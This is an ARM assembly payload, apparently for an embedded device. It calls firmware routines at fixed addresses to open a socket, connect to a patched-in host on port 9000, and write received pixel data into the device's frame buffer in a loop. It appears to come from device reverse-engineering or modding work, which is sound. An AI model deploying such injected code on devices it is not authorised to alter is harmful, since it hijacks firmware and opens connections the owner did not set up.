
.text
.global _start

_start:
    .code 32

    @ calling netSocket(1, 1, 0, 0)
    MOV R0, #1           @ domain
    MOV R1, #1           @ type
    MOV R2, #0           @ protocol
    MOV R3, #0           @ ensure last param is 0
    LDR R4, =#0x424BBFB4 @ int netSocket(int domain, int type, int protocol);
    BLX R4

    LDR R1, =#0x4455A000 @ save socket fd
    STR R0, [R1]

    @ struct sockaddr_in {
    @     short            sin_family;   // 0x100
    @     unsigned short   sin_port;     // htons(9000)
    @     struct in_addr   sin_addr;     // htonl(0xc0a80b03) -> 192.168.11.3
    @ };

    @ calling netConnect(sockfd, &addr, 8)
    LDR R1, =0xefbeadde  @ sin_addr (must be patched)
    STR R1, [SP, #4]
    MOV R1, #0x2823      @ sin_port = htons(9000)
    STRH R1, [SP, #2]
    MOV R1, #0x100       @ sin_family = AF_INET
    STRH R1, [SP, #0]
    MOV R1, SP           @ load sockaddr from stack

    MOV R2, #8           @ load addrlen
    MOV R3, #0           @ ensure last param is 0
    LDR R4, =0x424BC298  @ int netConnect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    BLX R4

    LDR R5, =#0x40900000        @ frame buffer start
    LDR R6, =#0x40a19400        @ frame buffer end (0x40900000 + 0xxx)

_loop:

    @ calling netRecv(sockfd, buff, 3, 0)
    LDR R0, =#0x4455A000        @ load socket value
    LDR R0, [R0]
    MOV R1, R5
    MOV R2, #3
    MOV R3, #0
    LDR R4, =#0x424BC554        @ netRecv(sockfd, buff, len, flags)
    BLX R4

_next_pixel:
    ADD R5, R5, #0x3
    CMP R5, R6
    BLT _loop
_next_frame:

    @ calling sedev_powerOnImgSns()
    LDR R5, =#0x40900000
    LDR R1, =#0x4197CFDC        @ sedev_powerOnImgSns()
    BLX R1
    B _loop
